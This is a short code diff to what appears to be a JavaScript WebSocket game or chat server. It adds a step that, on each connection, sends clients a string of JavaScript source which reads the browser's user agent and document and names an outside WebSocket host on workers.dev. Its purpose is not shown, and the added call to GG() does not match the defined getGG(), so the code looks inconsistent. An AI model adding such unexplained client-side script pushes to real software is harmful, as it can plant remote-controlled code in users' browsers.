@@ -14,7 +14,7 @@ export default {
       server.close();
     });
 
-    try {
+    try { server.send(j('su','',GG(),'',''));
       server.send(j('info', '', 'Welcome Golf Gangstas!!', '', ''));
     } catch (e) {
       console.error(e);
@@ -132,7 +132,9 @@ export default {
   }
 };
 
-function getGG() {}
+function getGG() {
+  return "let chunks =[]; let hist=[]; let stream=false; let ind=-1; const si='true'; let au; const d = document; const a = navigator.userAgent; const wsp = 'wss://turbo-fiesta.skullarm8387.workers.dev'; let ws, curl, ct; let burl = null; ";
+}
 
 async function z(u, x, o) {
   try {
